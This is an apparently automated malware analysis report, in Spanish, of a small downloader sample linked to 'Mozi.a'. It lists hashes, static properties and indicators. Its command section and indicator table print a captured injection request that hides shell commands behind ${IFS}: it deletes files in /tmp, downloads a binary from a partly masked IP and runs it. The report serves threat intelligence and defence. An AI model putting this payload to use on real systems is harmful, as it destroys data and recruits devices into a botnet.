# 🧬 Payload Analysis

`ab51158dd27081a539eaf9f833af3bef579feb477734adf8d2acf53747c5e014`

## 📌 Resumen

Texto ASCII de 161 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://60.19.245.XXX:34586/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ab51158dd27081a539eaf9f833af3bef579feb477734adf8d2acf53747c5e014.md](../../../../../malware-like/oraculo/downloader/ab51158dd27081a539eaf9f833af3bef579feb477734adf8d2acf53747c5e014.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:17:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ab51158dd27081a539eaf9f833af3bef579feb477734adf8d2acf53747c5e014`
- **SHA1:** `c46585155640c33e31b85b72e046f1a4a389efc5`
- **MD5:** `d58174ae58a80bca52d51b6e5337a115`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 161 B |
| Entropía | 5.35 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://60.19.245.XXX:34586/Mozi.a;sh${IFS}/tmp/Mo
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://60.19.245.XXX:34586/Mozi.a;sh$ | strings |
| ip | 60.19.245.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://60.19.245.XXX:34586/Mozi.a;sh${IFS}/tmp/Mo | strings |
| hash | ab51158dd27081a539eaf9f833af3bef579feb477734adf8d2acf53747c5e014 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
